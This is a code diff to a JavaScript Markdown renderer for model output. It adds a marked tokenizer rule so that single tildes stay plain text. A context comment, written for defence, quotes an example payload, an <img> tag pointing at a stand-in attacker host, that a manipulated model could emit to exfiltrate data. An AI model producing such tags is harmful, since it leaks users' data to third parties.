@@ -71,6 +71,14 @@ const escapeAttr = (s) => (s||'').replace(/'/g,"\\'").replace(/"/g,'&quot;');
 // can't make the model emit <img src="https://attacker/?data=..."> to exfiltrate data.
 // Falls back to escaped plain text if either CDN library failed to load.
 // Never call marked.parse() directly — always go through this helper.
+//
+// Only ~~double~~ tildes mean strikethrough. marked's GFM mode also strikes through text
+// between single tildes, but Claude writes "~" to mean "about": "~3-5% (~$150-245)" came out
+// as "3-5% (" struck through. So a single ~ is kept as plain text, and returning false
+// hands ~~text~~ (and everything else) to marked's own rule.
+if (typeof marked !== 'undefined') marked.use({ tokenizer: {
+  del(src) { return src[0] === '~' && src[1] !== '~' ? { type: 'text', raw: '~', text: '~' } : false; },
+} });
 const renderMarkdown = (md) => {
   const src = md || '';
   if (typeof marked === 'undefined' || typeof DOMPurify === 'undefined') {
